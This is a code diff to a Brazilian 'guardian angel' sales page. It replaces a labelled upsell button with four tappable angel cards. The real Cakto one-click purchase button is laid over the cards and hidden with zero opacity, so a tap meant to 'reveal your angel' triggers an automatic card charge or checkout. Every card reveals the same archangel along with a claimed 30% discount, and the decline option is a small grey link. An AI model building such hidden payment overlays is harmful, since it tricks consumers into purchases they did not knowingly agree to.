@@ -85,7 +85,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-bottom: 100px;
+      padding-bottom: 160px;
     }
     @media (max-width: 600px) {
       .banner-topo { font-size: 0.98rem; padding: 10px 2vw 8px 2vw; }
@@ -138,64 +138,132 @@
   <!-- Fim -->
   <br> 
 <style>
-.upsell-button {
-  display: block;
+.cartas-painel {
   width: calc(100% - 32px);
-  max-width: 600px;
+  max-width: 480px;
   margin: 0 auto;
-  padding: 16px 22px;
-  background: #1FA85C;
-  color: #fff;
-  font-size: clamp(11px, 3vw, 16px);  /* reduz no mobile pra caber em 1 linha */
-  font-weight: 700;
-  text-transform: uppercase;
-  letter-spacing: 0.03em;
-  line-height: 1.3;
-  white-space: nowrap;                /* ← não quebra linha */
-  border: none;
-  border-radius: 12px;
-  cursor: pointer;
-  box-shadow: 0 5px 14px rgba(31, 168, 92, 0.3);
-  -webkit-tap-highlight-color: transparent;
-  touch-action: manipulation;
-  transition: background 0.15s, transform 0.1s, box-shadow 0.15s;
-  text-decoration: none;
-  text-align: center;
+  padding: 28px 20px 24px;
+  background: radial-gradient(circle at 50% 0%, #2a2440 0%, #14101f 60%, #0a0812 100%);
+  border-radius: 18px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
   box-sizing: border-box;
-}
-.upsell-button:hover {
-  background: #1B9551;
-  box-shadow: 0 7px 18px rgba(31, 168, 92, 0.4);
-}
-.upsell-button:active {
-  background: #16793F;
-  transform: scale(0.98);
-  box-shadow: 0 3px 9px rgba(31, 168, 92, 0.3);
-}
-
-.refuse-button {
-  display: block;
-  width: fit-content;
-  margin: 16px auto 0;
-  background: none;
-  border: none;
-  color: #999;
-  font-size: clamp(10px, 2.6vw, 12px);  /* menor pra caber em 1 linha */
-  line-height: 1.4;
-  padding: 0;
-  white-space: nowrap;                  /* ← não quebra linha */
-  cursor: pointer;
-  -webkit-tap-highlight-color: transparent;
-  touch-action: manipulation;
-  letter-spacing: 0.02em;
   text-align: center;
-  text-decoration: underline;
-  text-underline-offset: 3px;
+}
+.cartas-headline {
+  color: #f7dfa0;
+  font-weight: 800;
+  text-transform: uppercase;
+  font-size: clamp(1.05em, 4.2vw, 1.35em);
+  line-height: 1.35;
+  letter-spacing: 0.01em;
+  margin-bottom: 22px;
+  text-shadow: 0 0 14px rgba(247, 223, 160, 0.35);
+}
+.cartas-overlay-wrap {
+  position: relative;
+}
+.cartas-container {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  margin: 0 auto;
+}
+.carta {
+  display: block;
+  width: 22%;
+  max-width: 90px;
+  aspect-ratio: 3 / 5.3;
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: 0 0 16px rgba(247, 223, 160, 0.45);
+  transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.3s ease;
+  pointer-events: none; /* quem recebe o toque é o botão real da Cakto sobreposto */
+}
+.carta img {
+  display: block;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+.cartas-container.revelando .carta:not(.carta-escolhida) {
+  opacity: 0.35;
+}
+.carta-escolhida {
+  transform: translateY(-6px) scale(1.06);
+  box-shadow: 0 0 30px rgba(247, 223, 160, 0.9), inset 0 0 12px rgba(255,255,255,0.7);
+}
+/* Botão real da Cakto: invisível, cobrindo exatamente as 4 cartas.
+   É ele quem recebe o toque de verdade e faz a cobrança automática / redirecionamento. */
+cakto-upsell-buttons.cakto-overlay {
+  display: block !important;
+  position: absolute;
+  inset: 0;
+  z-index: 5;
+}
+cakto-upsell-buttons.cakto-overlay cakto-upsell-accept {
+  display: block !important;
+  width: 100% !important;
+  height: 100% !important;
+}
+cakto-upsell-buttons.cakto-overlay cakto-upsell-accept::part(button) {
+  width: 100% !important;
+  height: 100% !important;
+  min-height: 0 !important;
+  margin: 0 !important;
+  padding: 0 !important;
+  background: transparent !important;
+  box-shadow: none !important;
+  border: none !important;
+  border-radius: 10px !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  cursor: pointer !important;
+}
+.revelacao {
+  margin-top: 20px;
+}
+.revelacao-anjo {
+  color: #f7dfa0;
+  font-weight: 800;
+  font-size: 1.15em;
+  margin-bottom: 8px;
+  text-shadow: 0 0 14px rgba(247, 223, 160, 0.5);
+  animation: revelacao-fade 0.4s ease;
+}
+@keyframes revelacao-fade {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.revelacao-texto {
+  color: #f2e9d8;
+  font-size: 0.98em;
+  line-height: 1.5;
+}
+.preco-de {
+  color: #c9a5a5;
+  text-decoration: line-through;
+  margin-right: 6px;
+}
+.preco-por {
+  color: #7CFC9A;
+  font-weight: 800;
+}
+.revelacao-loading {
+  margin-top: 10px;
+  color: #cbb98a;
+  font-size: 0.85em;
+  font-style: italic;
+}
+.cartas-instrucao {
+  color: #cbb98a;
+  font-size: 0.85em;
+  line-height: 1.5;
+  margin-top: 18px;
 }
 
 @media (max-width: 380px) {
-  .upsell-button {
-    padding: 14px 12px;
+  .cartas-painel {
+    padding: 22px 14px 20px;
   }
 }
 </style>
@@ -203,97 +271,137 @@
 <!-- Botões ocultos — aparecem após 7 minutos -->
 <div id="wrapper-botoes" class="wrapper-botoes" style="display:none;">
 
-<div>
- <meta charset="UTF-8">
-   <cakto-upsell-buttons>
-      <cakto-upsell-accept
-        bg-color="#1FA85C"
-        text-color="#ffffff"
-        upsell-accept-url="https://angelsociety.site/upsell_092/"
-        offer-id="3frqmv3"
-        app-base-url="https://app.cakto.com.br"
-        offer-type="upsell"
-        upsell-reject-url="https://angelsociety.site/donwsell_0101/"   
-      >
-        Aceito a proteção do meu anjo da guarda! AMÉM 🙌🙏
-      </cakto-upsell-accept>
-      <cakto-upsell-reject
-        upsell-reject-url="https://angelsociety.site/donwsell_0101/"       
-      >
-        Desculpe meu anjo da guarda, mas quero ficar sem proteção hoje
-      </cakto-upsell-reject>
-    </cakto-upsell-buttons>  
+  <div class="cartas-painel">
+    <div class="cartas-headline">Descubra seu anjo da guarda e receba 30% de desconto agora</div>
 
-    <style>
-      /* ACEITAR — host ocupa a largura toda pra o % do botão funcionar */
-      cakto-upsell-accept {
-        display: block !important;
-        width: 100% !important;
-      }
-      cakto-upsell-accept::part(button) {
-        box-sizing: border-box !important;
-        display: block !important;
-        width: calc(100% - 32px) !important;
-        max-width: 600px !important;
-        margin: 0 auto !important;
-        padding: 16px 22px !important;
-        background: #1FA85C !important;
-        color: #ffffff !important;
-        font-size: clamp(13px, 3.2vw, 17px) !important;
-        font-weight: 700 !important;
-        text-transform: uppercase !important;
-        letter-spacing: 0.02em !important;
-        line-height: 1.3 !important;
-        white-space: normal !important;
-        border: none !important;
-        border-radius: 12px !important;
-        box-shadow: 0 5px 14px rgba(31,168,92,.3) !important;
-        cursor: pointer !important;
-        text-align: center !important;
-        transition: background .15s !important;
-      }
-      cakto-upsell-accept::part(button):hover {
-        background: #1B9551 !important;
-      }
-      cakto-upsell-accept::part(button):active {
-        background: #16793F !important;
-      }
+    <div class="cartas-overlay-wrap">
+      <div class="cartas-container" id="cartas-container">
+        <div class="carta" data-carta="1"><img src="images/carta_1.png" alt="Carta do anjo da guarda 1"></div>
+        <div class="carta" data-carta="2"><img src="images/carta_2.png" alt="Carta do anjo da guarda 2"></div>
+        <div class="carta" data-carta="3"><img src="images/carta_3.png" alt="Carta do anjo da guarda 3"></div>
+        <div class="carta" data-carta="4"><img src="images/carta_4.png" alt="Carta do anjo da guarda 4"></div>
+      </div>
 
-      /* RECUSAR — link cinza pequeno */
-      cakto-upsell-reject {
-        display: block !important;
-        color: #9a9a9a !important;
-        font-size: 12px !important;
-        text-align: center !important;
-      }
-      cakto-upsell-reject::part(button) {
-        color: #9a9a9a !important;
-        font-size: 12px !important;
-        margin-top: 12px !important;
-      }
-    </style>
+      <!-- Botão real da Cakto, invisível, sobreposto exatamente nas 4 cartas.
+           É ele quem recebe o toque de verdade: cobrança automática (cartão) ou checkout (pix) já ficam por conta do script da Cakto. -->
+      <cakto-upsell-buttons class="cakto-overlay">
+        <cakto-upsell-accept
+          id="cakto-accept-overlay"
+          bg-color="#1FA85C"
+          text-color="#ffffff"
+          upsell-accept-url="https://angelsociety.site/upsell_092/"
+          offer-id="3frqmv3"
+          app-base-url="https://app.cakto.com.br"
+          offer-type="upsell"
+          upsell-reject-url="https://angelsociety.site/donwsell_0101/"
+        >Descubra seu anjo da guarda</cakto-upsell-accept>
+      </cakto-upsell-buttons>
+    </div>
+
+    <div class="revelacao" id="revelacao" style="display:none;">
+      <div class="revelacao-anjo">✨ Arcanjo Miguel ✨</div>
+      <div class="revelacao-texto">
+        Seu anjo da guarda é o <strong>Arcanjo Miguel</strong>! Seu desconto de <strong>30%</strong> já foi aplicado automaticamente:
+        <br>
+        <span class="preco-de">R$ 229</span> <span class="preco-por">R$ 137</span>
+      </div>
+      <div class="revelacao-loading">Preparando sua proteção, aguarde...</div>
+    </div>
+
+    <div class="cartas-instrucao" id="cartas-instrucao">
+      Toque em uma das cartas acima, você revelará o seu anjo da guarda e automaticamente ele vai se conectar com você e transformar toda a sua vida.
+    </div>
+  </div>
+
+  <!-- Recusar: mesmo widget/link real de antes, só reposicionado -->
+  <cakto-upsell-buttons>
+    <cakto-upsell-reject
+      upsell-reject-url="https://angelsociety.site/donwsell_0101/"
+    >Desculpe meu anjo da guarda, mas quero ficar sem proteção hoje</cakto-upsell-reject>
+  </cakto-upsell-buttons>
+
+  <style>
+    /* RECUSAR — link cinza pequeno (igual configuração original) */
+    cakto-upsell-reject {
+      display: block !important;
+      color: #9a9a9a !important;
+      font-size: 12px !important;
+      text-align: center !important;
+    }
+    cakto-upsell-reject::part(button) {
+      color: #9a9a9a !important;
+      font-size: 12px !important;
+      margin-top: 12px !important;
+    }
+  </style>
   <script type="text/javascript" src="https://caktoscripts.nyc3.cdn.digitaloceanspaces.com/upsell.js"></script>
- </div>
-
 </div>
   <!-- Delay 7 minutos (420 segundos) -->
   <script>
     const delaySegundos = 264;
 
     document.addEventListener("DOMContentLoaded", function () {
+      const wrapper = document.getElementById('wrapper-botoes');
+
+      // Pré-visualização manual: abrir a página com ?preview no final da URL mostra a seção na hora, sem esperar o vídeo.
+      if (new URLSearchParams(window.location.search).has('preview')) {
+        wrapper.style.display = 'flex';
+        return;
+      }
+
       function verificarPlayer() {
         if (typeof smartplayer === 'undefined' || !(smartplayer.instances && smartplayer.instances.length)) {
           return setTimeout(verificarPlayer, 1000);
         }
         const player = smartplayer.instances[0];
         player.on('timeupdate', () => {
-          const wrapper = document.getElementById('wrapper-botoes');
           if (player.video.currentTime >= delaySegundos && wrapper.style.display === 'none') {
             wrapper.style.display = 'flex';
           }
         });
       }
       verificarPlayer();
+    });
+  </script>
+
+  <!-- Mecânica das cartas: o clique real acontece no botão invisível da Cakto por cima;
+       aqui só cuidamos do efeito visual (revelar o Arcanjo Miguel na carta tocada + mensagem). -->
+  <script>
+    const imgMiguelPreload091 = new Image();
+    imgMiguelPreload091.src = 'images/arcanjo_miguel.jpg';
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const acceptOverlay = document.getElementById('cakto-accept-overlay');
+      const cartasContainer = document.getElementById('cartas-container');
+      const revelacao = document.getElementById('revelacao');
+      const instrucao = document.getElementById('cartas-instrucao');
+      let jaRevelou = false;
+
+      if (!acceptOverlay || !cartasContainer) return;
+
+      acceptOverlay.addEventListener('click', function (e) {
+        if (jaRevelou) return;
+        jaRevelou = true;
+
+        const rect = cartasContainer.getBoundingClientRect();
+        const clickX = (e.clientX != null ? e.clientX : rect.left + rect.width / 2) - rect.left;
+        const indice = Math.min(3, Math.max(0, Math.floor((clickX / rect.width) * 4)));
+        const cartas = cartasContainer.querySelectorAll('.carta');
+        const cartaEscolhida = cartas[indice];
+
+        cartasContainer.classList.add('revelando');
+        if (cartaEscolhida) {
+          cartaEscolhida.classList.add('carta-escolhida');
+          const img = cartaEscolhida.querySelector('img');
+          if (img) img.src = 'images/arcanjo_miguel.jpg';
+        }
+
+        instrucao.style.display = 'none';
+        revelacao.style.display = 'block';
+        revelacao.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        // Sem preventDefault e sem redirecionar manualmente: o próprio botão da Cakto,
+        // por baixo, já cuida da cobrança automática e do redirecionamento.
+      });
     });
   </script>
 
